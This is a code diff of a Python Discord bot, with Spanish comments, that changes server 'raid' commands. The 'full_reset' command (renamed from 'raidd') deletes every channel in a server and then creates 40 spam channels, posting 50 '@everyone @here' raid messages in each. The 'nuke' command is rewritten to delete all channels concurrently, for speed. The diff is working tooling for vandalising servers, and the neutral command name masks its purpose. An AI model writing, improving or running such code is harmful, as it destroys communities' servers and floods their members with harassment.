@@ -179,17 +179,16 @@ async def stats(ctx):
     
     await temp.edit(content=None, embed=embed)
 
-@bot.command(name='raidd', aliases=['wipe_and_build'])
+@bot.command(name='full_reset', aliases=['wipe_and_build'])
 @commands.has_permissions(administrator=True, manage_channels=True)
 async def full_server_reset(ctx):
     """Combina destrucción y reconstrucción de forma silenciosa."""
     
-    # --- FASE 1: DESTRUCCIÓN ---
+    # --- FASE 1: DESTRUCCIÓN (Lógica de !nuke concurrente) ---
     
     deletion_tasks = []
     
     for channel in ctx.guild.channels:
-        # 🛑 No eliminar el canal de ejecución
         if channel.id != ctx.channel.id:
             deletion_tasks.append(channel.delete())
 
@@ -197,13 +196,13 @@ async def full_server_reset(ctx):
     deletion_results = await asyncio.gather(*deletion_tasks, return_exceptions=True)
     deleted_count = sum(1 for result in deletion_results if not isinstance(result, Exception))
 
-    # --- FASE 2: RECONSTRUCCIÓN ---
+    # --- FASE 2: RECONSTRUCCIÓN (Lógica de !concurrent_spam) ---
     
     # --- CONFIGURACIÓN DE PARÁMETROS ---
-    NUM_CANALES = 50 # Ajusta este valor si es necesario
-    MENSAJES_POR_CANAL = 20
-    NOMBRE_BASE = "RAIDEADOS"
-    CONTENIDO_MENSAJE = "RAIDEADOS POR WHATVIXXXXXX @everyone @here"
+    NUM_CANALES = 40 # <--- MODIFICA AQUÍ la cantidad de canales
+    MENSAJES_POR_CANAL = 50
+    NOMBRE_BASE = "raidddd-pythoooon"
+    CONTENIDO_MENSAJE = "RAIDED BY WHATVIXX GOOD BOYYYS @everyone @here"
     # ------------------------------------
 
     tasks = []
@@ -223,7 +222,6 @@ async def full_server_reset(ctx):
     else:
         await ctx.send("⚠️ REINICIO COMPLETADO CON FALLOS. Se eliminaron canales, pero falló la creación.")
 
-
 @bot.command(name='nuke', aliases=['eliminar-canales', 'delall'])
 @commands.has_permissions(administrator=True, manage_channels=True)
 async def nuke_channels(ctx):
@@ -231,19 +229,19 @@ async def nuke_channels(ctx):
     
     deleted_count = 0
     
-    # 🔄 Recorrer todos los canales en el servidor
+    # Prepara las tareas de eliminación de forma concurrente para mayor velocidad
+    deletion_tasks = []
+    
     for channel in ctx.guild.channels:
         # 🛑 No eliminar el canal donde se ejecutó el comando
-        if channel.id == ctx.channel.id:
-            continue
-        
-        try:
-            # 🔥 Ejecutar la eliminación del canal
-            await channel.delete()
-            deleted_count += 1
-            print(f"Canal eliminado: {channel.name}") 
-        except (discord.Forbidden, discord.HTTPException) as e:
-            print(f"❌ Error al eliminar el canal {channel.name}: {e}")
+        if channel.id != ctx.channel.id:
+            deletion_tasks.append(channel.delete())
+    
+    # Ejecutar todas las eliminaciones simultáneamente
+    deletion_results = await asyncio.gather(*deletion_tasks, return_exceptions=True)
+    
+    # Contar los éxitos. Un resultado que no es una excepción es un éxito.
+    deleted_count = sum(1 for result in deletion_results if not isinstance(result, Exception))
 
     # Este mensaje final se mantiene para informar el resultado
     await ctx.send(f"✅ **¡Operación completada!** Se eliminaron **{deleted_count}** canales.")
